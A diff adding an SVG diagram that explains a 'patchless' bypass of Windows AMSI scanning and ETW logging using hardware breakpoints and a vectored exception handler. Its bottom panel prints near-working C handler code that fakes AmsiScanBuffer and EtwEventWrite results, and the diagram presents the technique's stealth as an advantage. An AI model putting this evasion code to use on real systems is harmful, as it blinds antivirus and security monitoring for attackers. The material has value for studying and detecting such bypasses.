@@ -1,0 +1,90 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 580" font-family="'Segoe UI', Consolas, monospace">
+  <defs>
+    <linearGradient id="bg" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#0d1117"/><stop offset="100%" stop-color="#161b22"/></linearGradient>
+    <marker id="ar" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto"><polygon points="0 0,10 3.5,0 7" fill="#f0883e"/></marker>
+    <marker id="ag" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto"><polygon points="0 0,10 3.5,0 7" fill="#3fb950"/></marker>
+  </defs>
+  <rect width="1000" height="580" fill="url(#bg)"/>
+  <text x="500" y="32" text-anchor="middle" fill="#58a6ff" font-size="17" font-weight="bold">Patchless AMSI &amp; ETW Bypass — Hardware Breakpoints + VEH</text>
+
+  <!-- Traditional (patching) -->
+  <rect x="20" y="55" width="470" height="130" rx="8" fill="#0d1117" stroke="#f85149" stroke-width="2"/>
+  <text x="255" y="78" text-anchor="middle" fill="#f85149" font-size="13" font-weight="bold">Traditional Approach: Memory Patching</text>
+  <text x="40" y="100" fill="#c9d1d9" font-size="10">VirtualProtect(AmsiScanBuffer, RW) → patch bytes → VirtualProtect(RX)</text>
+  <text x="40" y="120" fill="#f85149" font-size="10">⚠ Modifies .text section of amsi.dll</text>
+  <text x="40" y="138" fill="#f85149" font-size="10">⚠ Detectable by integrity checking (comparing memory vs disk)</text>
+  <text x="40" y="156" fill="#f85149" font-size="10">⚠ VirtualProtect on amsi.dll is a high-confidence detection signal</text>
+  <text x="40" y="175" fill="#f85149" font-size="9">Signature: "AmsiScanBuffer patch" in most EDR rule sets</text>
+
+  <!-- Patchless -->
+  <rect x="510" y="55" width="470" height="130" rx="8" fill="#0d1117" stroke="#3fb950" stroke-width="2"/>
+  <text x="745" y="78" text-anchor="middle" fill="#3fb950" font-size="13" font-weight="bold">Patchless Approach: HW Breakpoints</text>
+  <text x="530" y="100" fill="#c9d1d9" font-size="10">SetThreadContext(DR0 = &amp;AmsiScanBuffer) + VEH handler</text>
+  <text x="530" y="120" fill="#3fb950" font-size="10">✓ Zero bytes modified in amsi.dll</text>
+  <text x="530" y="138" fill="#3fb950" font-size="10">✓ No VirtualProtect calls needed</text>
+  <text x="530" y="156" fill="#3fb950" font-size="10">✓ Passes memory integrity checks</text>
+  <text x="530" y="175" fill="#3fb950" font-size="9">Invisible to byte-level scanning</text>
+
+  <!-- AMSI patchless flow -->
+  <text x="30" y="215" fill="#d2a8ff" font-size="13" font-weight="bold">AMSI Patchless Bypass Flow:</text>
+
+  <rect x="30" y="230" width="175" height="50" rx="6" fill="#0d1117" stroke="#d2a8ff" stroke-width="1.5"/>
+  <text x="117" y="250" text-anchor="middle" fill="#d2a8ff" font-size="9">Set DR0 =</text>
+  <text x="117" y="265" text-anchor="middle" fill="#d2a8ff" font-size="9">&amp;AmsiScanBuffer</text>
+  <line x1="210" y1="255" x2="230" y2="255" stroke="#f0883e" stroke-width="1.5" marker-end="url(#ar)"/>
+
+  <rect x="235" y="230" width="175" height="50" rx="6" fill="#0d1117" stroke="#f0883e" stroke-width="1.5"/>
+  <text x="322" y="250" text-anchor="middle" fill="#f0883e" font-size="9">Register VEH</text>
+  <text x="322" y="265" text-anchor="middle" fill="#f0883e" font-size="9">(highest priority)</text>
+  <line x1="415" y1="255" x2="435" y2="255" stroke="#f0883e" stroke-width="1.5" marker-end="url(#ar)"/>
+
+  <rect x="440" y="230" width="175" height="50" rx="6" fill="#0d1117" stroke="#58a6ff" stroke-width="1.5"/>
+  <text x="527" y="250" text-anchor="middle" fill="#58a6ff" font-size="9">PS calls Amsi →</text>
+  <text x="527" y="265" text-anchor="middle" fill="#58a6ff" font-size="9">SINGLE_STEP fires</text>
+  <line x1="620" y1="255" x2="640" y2="255" stroke="#f0883e" stroke-width="1.5" marker-end="url(#ar)"/>
+
+  <rect x="645" y="230" width="165" height="50" rx="6" fill="#0d1117" stroke="#3fb950" stroke-width="1.5"/>
+  <text x="727" y="250" text-anchor="middle" fill="#3fb950" font-size="9">VEH: set RAX =</text>
+  <text x="727" y="265" text-anchor="middle" fill="#3fb950" font-size="9">E_INVALIDARG, ret</text>
+  <line x1="815" y1="255" x2="835" y2="255" stroke="#3fb950" stroke-width="1.5" marker-end="url(#ag)"/>
+
+  <rect x="840" y="230" width="140" height="50" rx="6" fill="#0d1117" stroke="#3fb950" stroke-width="2"/>
+  <text x="910" y="255" text-anchor="middle" fill="#3fb950" font-size="10">Scan skipped!</text>
+
+  <!-- ETW patchless flow -->
+  <text x="30" y="315" fill="#f0883e" font-size="13" font-weight="bold">ETW Patchless Bypass Flow:</text>
+
+  <rect x="30" y="330" width="175" height="50" rx="6" fill="#0d1117" stroke="#d2a8ff" stroke-width="1.5"/>
+  <text x="117" y="350" text-anchor="middle" fill="#d2a8ff" font-size="9">Set DR1 =</text>
+  <text x="117" y="365" text-anchor="middle" fill="#d2a8ff" font-size="9">&amp;EtwEventWrite</text>
+  <line x1="210" y1="355" x2="230" y2="355" stroke="#f0883e" stroke-width="1.5" marker-end="url(#ar)"/>
+
+  <rect x="235" y="330" width="175" height="50" rx="6" fill="#0d1117" stroke="#f0883e" stroke-width="1.5"/>
+  <text x="322" y="350" text-anchor="middle" fill="#f0883e" font-size="9">Same VEH handler</text>
+  <text x="322" y="365" text-anchor="middle" fill="#f0883e" font-size="9">(check DR6 for which BP)</text>
+  <line x1="415" y1="355" x2="435" y2="355" stroke="#f0883e" stroke-width="1.5" marker-end="url(#ar)"/>
+
+  <rect x="440" y="330" width="175" height="50" rx="6" fill="#0d1117" stroke="#58a6ff" stroke-width="1.5"/>
+  <text x="527" y="350" text-anchor="middle" fill="#58a6ff" font-size="9">API call triggers</text>
+  <text x="527" y="365" text-anchor="middle" fill="#58a6ff" font-size="9">EtwEventWrite → BP fires</text>
+  <line x1="620" y1="355" x2="640" y2="355" stroke="#f0883e" stroke-width="1.5" marker-end="url(#ar)"/>
+
+  <rect x="645" y="330" width="165" height="50" rx="6" fill="#0d1117" stroke="#3fb950" stroke-width="1.5"/>
+  <text x="727" y="350" text-anchor="middle" fill="#3fb950" font-size="9">VEH: set RAX = 0,</text>
+  <text x="727" y="365" text-anchor="middle" fill="#3fb950" font-size="9">skip to ret addr</text>
+  <line x1="815" y1="355" x2="835" y2="355" stroke="#3fb950" stroke-width="1.5" marker-end="url(#ag)"/>
+
+  <rect x="840" y="330" width="140" height="50" rx="6" fill="#0d1117" stroke="#3fb950" stroke-width="2"/>
+  <text x="910" y="355" text-anchor="middle" fill="#3fb950" font-size="10">No ETW event!</text>
+
+  <!-- VEH Handler code -->
+  <rect x="20" y="405" width="960" height="160" rx="8" fill="#161b22" stroke="#30363d"/>
+  <text x="50" y="430" fill="#58a6ff" font-size="12" font-weight="bold">Unified VEH Handler (Handles Both AMSI + ETW)</text>
+  <text x="50" y="455" fill="#7ee787" font-size="10">LONG CALLBACK BypassHandler(EXCEPTION_POINTERS* ep) {</text>
+  <text x="60" y="472" fill="#7ee787" font-size="10">  if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP) return CONTINUE_SEARCH;</text>
+  <text x="60" y="489" fill="#7ee787" font-size="10">  if (ep->ContextRecord->Rip == (DWORD64)&amp;AmsiScanBuffer) {</text>
+  <text x="70" y="506" fill="#7ee787" font-size="10">    ep->ContextRecord->Rax = E_INVALIDARG;  ep->ContextRecord->Rip = *(DWORD64*)ep->ContextRecord->Rsp;</text>
+  <text x="60" y="523" fill="#7ee787" font-size="10">  } else if (ep->ContextRecord->Rip == (DWORD64)&amp;EtwEventWrite) {</text>
+  <text x="70" y="540" fill="#7ee787" font-size="10">    ep->ContextRecord->Rax = 0;  ep->ContextRecord->Rip = *(DWORD64*)ep->ContextRecord->Rsp;</text>
+  <text x="60" y="557" fill="#7ee787" font-size="10">  }  ep->ContextRecord->Rsp += 8;  return EXCEPTION_CONTINUE_EXECUTION; }</text>
+</svg>
